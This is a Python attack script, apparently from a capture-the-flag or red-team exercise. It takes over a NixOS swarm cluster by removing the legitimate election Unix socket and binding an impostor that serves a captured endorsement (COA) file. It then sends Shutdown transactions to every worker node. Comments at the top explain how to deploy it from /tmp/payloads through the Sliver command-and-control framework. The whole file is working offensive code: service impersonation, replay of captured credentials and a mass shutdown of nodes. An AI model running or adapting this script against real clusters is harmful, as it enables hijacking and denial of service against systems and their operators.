#!/usr/bin/env python3
# USAGE ON SWARM NODES (NixOS):
#   Upload to /tmp/payloads/06_takeover_combined.py, then run it with the full Python path:
#     /run/current-system/sw/bin/python3 /tmp/payloads/06_takeover_combined.py [args]
#   If launching through Sliver, use:
#     execute -o /run/current-system/sw/bin/python3 -- /tmp/payloads/06_takeover_combined.py [args]
#   Common helper binaries are also under /run/current-system/sw/bin/, e.g.:
#     /run/current-system/sw/bin/cat
#     /run/current-system/sw/bin/ls
#     /run/current-system/sw/bin/bash
"""
offense/06_takeover_combined.py

Single-process variant of fake-election-socket plus swarm kill.
Defaults to recon.json and captured_coa.json to avoid manual edits.
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gg_core  # noqa: E402


def serve_election_socket(path: str, coa_bytes: bytes, stop: threading.Event) -> None:
    try:
        os.unlink(path)
    except (FileNotFoundError, PermissionError):
        pass
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        srv.bind(path)
        os.chmod(path, 0o777)
        srv.listen(64)
        srv.settimeout(0.5)
    except OSError as e:
        print(gg_core.format_socket_error(path, e, action="bind/listen on"), file=sys.stderr)
        srv.close()
        stop.set()
        return
    print(f"[*] COA server up at {path}")
    while not stop.is_set():
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            conn.sendall(coa_bytes)
        except OSError:
            pass
        finally:
            conn.close()
    srv.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--recon", default=gg_core.DEFAULT_RECON_PATH)
    ap.add_argument("--coa", default=gg_core.DEFAULT_COA_PATH)
    ap.add_argument("--serve-s", type=int, default=30, help="seconds to keep serving COA after kills queued")
    args = ap.parse_args()

    recon = gg_core.load_recon(args.recon)
    coa = gg_core.load_coa(args.coa)
    if coa.is_empty():
        print("[!] COA has no endorsements; aborting.")
        return 1

    our_uuid = recon.get("our_uuid", "")
    comms_sock = recon.get("comms_socket", "")
    election_sock = recon.get("election_socket", "")
    workers = gg_core.worker_uuids(recon)
    if not our_uuid or not comms_sock or not election_sock:
        print("[!] recon is missing required socket or UUID data", file=sys.stderr)
        return 2

    coa_bytes = json.dumps(coa.to_dict()).encode("utf-8")
    stop = threading.Event()
    t = threading.Thread(target=serve_election_socket, args=(election_sock, coa_bytes, stop), daemon=True)
    t.start()
    time.sleep(1.0)
    if stop.is_set():
        return 1

    print(f"[*] Queueing Shutdown for {len(workers)} workers")
    comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        comms.connect(comms_sock)
    except OSError as e:
        print(gg_core.format_socket_error(comms_sock, e, action="connect to"), file=sys.stderr)
        comms.close()
        stop.set()
        return 2
    for worker in workers:
        comms.sendall(gg_core.make_shutdown_tx(our_uuid, worker, coa, b64_payload=True))
        comms.sendall(gg_core.make_shutdown_tx(our_uuid, worker, coa, b64_payload=False))
        print(f"  -> Shutdown -> {worker[:8]}")
    comms.close()

    print(f"[+] Queued. Holding COA server open for {args.serve_s}s...")
    try:
        time.sleep(args.serve_s)
    except KeyboardInterrupt:
        pass
    stop.set()
    print("[+] Done.")
    return 0


if __name__ == "__main__":
    sys.exit(gg_core.run_main(main))
